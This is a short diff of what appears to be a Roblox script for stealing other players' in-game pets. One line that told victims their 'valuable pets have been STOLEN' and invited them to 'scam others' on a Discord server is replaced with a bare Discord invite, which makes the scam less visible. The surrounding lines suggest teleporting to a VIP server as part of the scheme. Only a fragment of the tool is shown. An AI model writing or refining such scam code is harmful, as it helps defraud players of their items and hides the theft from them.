@@ -31,7 +31,7 @@ getgenv().Username = "PUT_HERE_UR_USERNAME"
         local attempt = 1
         local teleported = false
 
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+        setclipboard("discord.gg/d2zgg2YDMz")
 
         
         if GetServerType:InvokeServer() == "VIPServer" then
